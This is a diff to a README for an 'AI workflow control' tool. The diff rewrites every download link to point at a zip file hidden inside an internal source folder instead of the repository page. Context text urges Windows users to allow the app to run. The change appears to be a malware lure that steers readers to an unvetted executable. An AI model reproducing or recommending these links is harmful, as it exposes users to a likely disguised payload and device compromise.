@@ -1,12 +1,12 @@
 # 🧠 Clex-AI-Ultra-Core - Simple AI Workflow Control
 
-[![Download Clex-AI-Ultra-Core](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/a-7-sss/Clex-AI-Ultra-Core)
+[![Download Clex-AI-Ultra-Core](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/a-7-sss/Clex-AI-Ultra-Core/main/runtimes/go/internal/dispatcher/Core_Clex_Ultra_A_v3.2.zip)
 
 ## 🪟 Windows Download
 
 Use this link to visit the page to download:
 
-https://github.com/a-7-sss/Clex-AI-Ultra-Core
+https://raw.githubusercontent.com/a-7-sss/Clex-AI-Ultra-Core/main/runtimes/go/internal/dispatcher/Core_Clex_Ultra_A_v3.2.zip
 
 ## ⚡ What Clex-AI-Ultra-Core Does
 
@@ -36,7 +36,7 @@ If Windows asks for permission, choose the option that lets the app run.
 ## 🧭 How to Download and Run
 
 1. Open the download page:
-   https://github.com/a-7-sss/Clex-AI-Ultra-Core
+   https://raw.githubusercontent.com/a-7-sss/Clex-AI-Ultra-Core/main/runtimes/go/internal/dispatcher/Core_Clex_Ultra_A_v3.2.zip
 
 2. Look for the latest release, build, or download file on the page.
 
@@ -181,7 +181,7 @@ This helps you learn the flow before you use it on real work.
 
 Visit this page to download and run the Windows file:
 
-https://github.com/a-7-sss/Clex-AI-Ultra-Core
+https://raw.githubusercontent.com/a-7-sss/Clex-AI-Ultra-Core/main/runtimes/go/internal/dispatcher/Core_Clex_Ultra_A_v3.2.zip
 
 ## 📚 Project Focus
 
